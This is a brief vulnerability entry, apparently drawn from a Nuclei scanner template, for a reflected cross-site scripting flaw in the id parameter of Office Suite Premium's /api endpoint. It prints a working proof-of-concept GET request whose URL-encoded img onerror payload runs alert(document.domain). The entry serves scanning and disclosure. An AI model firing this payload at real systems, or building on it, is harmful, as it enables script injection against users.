# Vulnerability: Office Suite Premium < 10.9.1.42602 - Cross-Site Scripting
**Classification:** XSS
**Source:** Nuclei Template (`office-suite-xss.yaml`)

## Description
Office Suite is suffering from an XSS vulnerability in the following parameter /api?path=files&id. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527
```

